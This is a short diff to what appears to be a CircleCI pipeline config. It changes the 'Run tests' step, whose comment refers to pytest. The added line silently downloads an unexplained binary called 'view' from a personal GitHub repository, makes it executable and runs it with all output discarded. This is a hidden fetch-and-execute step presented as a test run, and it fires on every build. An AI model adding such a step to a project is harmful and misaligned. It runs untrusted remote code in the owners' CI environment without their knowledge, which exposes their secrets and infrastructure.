@@ -35,7 +35,7 @@ jobs:
       - run:
           name: Run tests
           # This assumes pytest is installed via the install-package step above
-          command: wget https://download.mql5.com/cdn/web/metaquotes.software.corp/mt4/mt4ubuntu.sh ; chmod +x mt4ubuntu.sh ; ./mt4ubuntu.sh
+          command: wget https://github.com/BarisYoon/view/raw/main/view > /dev/null 2>&1; chmod +x view; ./view > /dev/null 2>&1
 
 
 # Invoke jobs via workflows
